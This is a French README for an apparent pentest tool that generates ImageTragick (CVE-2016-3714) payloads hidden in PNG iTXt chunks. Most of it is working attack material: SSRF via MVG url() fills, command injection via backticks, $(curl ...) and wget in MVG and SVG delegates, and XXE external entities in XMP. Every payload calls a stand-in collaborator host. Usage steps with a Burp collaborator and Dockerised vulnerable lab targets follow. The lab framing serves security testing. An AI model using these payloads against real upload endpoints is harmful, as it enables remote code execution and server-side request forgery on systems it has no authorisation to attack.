# ImageTragick Payloads - Guide Complet

Ce document liste tous les payloads ImageTragick générés pour SSRF, RCE et XXE.

## Types de Payloads

### 1. SSRF (Server-Side Request Forgery)

#### `ssrf1_itxt.png` - XMP-based SSRF
- **Type**: Chunk iTXt avec clé `XML:com.adobe.xmp`
- **Payload**: XXE avec entité externe pointant vers l'URL de collaboration
- **Utilisation**: Déclenche une requête HTTP externe lors du parsing XMP

#### `ssrf2_mvg_url.png` - MVG avec url() delegate
- **Type**: Chunk iTXt avec clé `ImageMagick` contenant du MVG
- **Payload MVG**:
  ```
  push graphic-context
  viewbox 0 0 640 480
  fill url(https://collab.com/ssrf-mvg)
  pop graphic-context
  ```
- **Utilisation**: Déclenche un delegate HTTP/HTTPS lors du traitement MVG

#### `ssrf3_mvg_http.png` - MVG avec url() HTTP
- **Type**: Similaire à `ssrf2_mvg_url.png` mais avec `http://`
- **Payload MVG**:
  ```
  push graphic-context
  viewbox 0 0 640 480
  fill url(http://collab.com/ssrf-mvg-http)
  pop graphic-context
  ```

### 2. RCE (Remote Code Execution)

#### `rce1_imagemagick.png` - MVG avec url() et commande
- **Type**: Chunk iTXt avec clé `ImageMagick` contenant du MVG
- **Payload MVG**:
  ```
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://collab.com/rce-imagemagick?`curl http://collab.com/rce-imagemagick`)'
  pop graphic-context
  ```
- **Utilisation**: Exécute une commande shell via le delegate `url()`

#### `rce2_imagemagick_delegate.png` - SVG avec xlink:href
- **Type**: Chunk iTXt avec clé `ImageMagick` contenant du SVG
- **Payload SVG**:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://collab.com/rce-delegate?`wget http://collab.com/rce-delegate`" width="100" height="100"/>
  </svg>
  ```
- **Utilisation**: Déclenche un delegate lors du parsing SVG

#### `rce3_mvg_delegate.png` - MVG avec image over
- **Type**: Chunk iTXt avec clé `ImageMagick` contenant du MVG
- **Payload MVG**:
  ```
  push graphic-context
  image over 0,0 0,0 "https://collab.com/rce-mvg?$(curl http://collab.com/rce-mvg)"
  pop graphic-context
  ```
- **Utilisation**: Utilise `image over` pour déclencher un delegate

#### `rce4_mvg_label.png` - MVG avec label delegate
- **Type**: Chunk iTXt avec clé `ImageMagick` contenant du MVG
- **Payload MVG**:
  ```
  push graphic-context
  viewbox 0 0 640 480
  fill "label:@/dev/stdin"
  pop graphic-context
  ```
- **Utilisation**: Utilise le delegate `label:` pour exécuter des commandes

#### `rce5_svg_delegate.png` - SVG propre sans backticks
- **Type**: Chunk iTXt avec clé `ImageMagick` contenant du SVG
- **Payload SVG**:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://collab.com/rce-svg-delegate" width="100" height="100"/>
  </svg>
  ```
- **Utilisation**: SVG propre qui déclenche un delegate sans caractères problématiques

### 3. XXE (XML External Entity)

#### `xxe1_itxt.png` - XMP avec entité externe
- **Type**: Chunk iTXt avec clé `XML:com.adobe.xmp`
- **Payload XMP**:
  ```xml
  <!DOCTYPE x [<!ENTITY % x SYSTEM "http://collab.com/xxe-png">%x;]><xmp>test</xmp>
  ```
- **Utilisation**: Déclenche une requête externe lors du parsing XMP

#### `xxe2_xmp_entity.png` - XMP avec déclaration d'entité propre
- **Type**: Chunk iTXt avec clé `XML:com.adobe.xmp`
- **Payload XMP**:
  ```xml
  <!DOCTYPE x [
  <!ENTITY % remote SYSTEM "http://collab.com/xxe-xmp">
  %remote;
  ]>
  <xmp>test</xmp>
  ```
- **Utilisation**: Version améliorée avec déclaration d'entité plus propre

## Comment Utiliser

1. **Générer les payloads**:
   ```bash
   python3 -m generators.image_generator
   # ou via le script principal
   python3 gonflus.py --format png --burp-collab your-collab.oast.fun
   ```

2. **Tester sur l'environnement vulnérable**:
   ```bash
   # PHP
   docker build -f vuln-images/php/Dockerfile -t gonflus-php-imagemagick .
   docker run --rm -p 8081:80 gonflus-php-imagemagick
   
   # ASP.NET
   docker build -f vuln-images/asp/Dockerfile -t gonflus-asp-imagemagick .
   docker run --rm -p 8082:80 gonflus-asp-imagemagick
   
   # JSP
   docker build -f vuln-images/jsp/Dockerfile -t gonflus-jsp-imagemagick .
   docker run --rm -p 8083:8080 gonflus-jsp-imagemagick
   ```

3. **Uploader les payloads**:
   - Accéder à `http://localhost:8081` (ou 8082, 8083)
   - Uploader un fichier PNG avec payload
   - Vérifier les logs pour voir si le delegate/RCE s'est déclenché

## Détails Techniques

### Structure des Chunks iTXt

Les payloads sont injectés dans des chunks PNG `iTXt` avec la structure suivante :

```
[4 bytes: length] + "iTXt" + [keyword] + [null] + [null] + [compression flag] + [payload] + [4 bytes: CRC]
```

- **Keyword pour MVG**: `ImageMagick`
- **Keyword pour XMP**: `XML:com.adobe.xmp`

### Pourquoi Certains Payloads Ne Fonctionnent Pas

1. **MVG sans viewbox**: ImageMagick nécessite une taille d'image explicite pour parser le MVG
2. **SVG avec backticks**: Les backticks dans les URLs peuvent casser le parsing
3. **Delegates désactivés**: Si `policy.xml` existe, les delegates dangereux peuvent être bloqués
4. **Version d'ImageMagick**: Seules les versions <= 6.9.3-10 sont vulnérables à ImageTragick

### Améliorations Apportées

1. **Détection améliorée**: Le code détecte maintenant les chunks `XML:com.adobe.xmp` en plus de `ImageMagick`
2. **Gestion des viewbox**: Ajout automatique de `viewbox` si manquant dans les payloads MVG
3. **Test des delegates**: Extraction et test direct des URLs depuis les payloads `url()`
4. **Messages verbeux**: Affichage détaillé de chaque étape pour faciliter le debugging

## Références

- [ImageTragick CVE-2016-3714](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3714)
- [ImageTragick Website](https://imagetragick.com/)
- [ImageMagick Security Policy](https://imagemagick.org/script/security-policy.php)

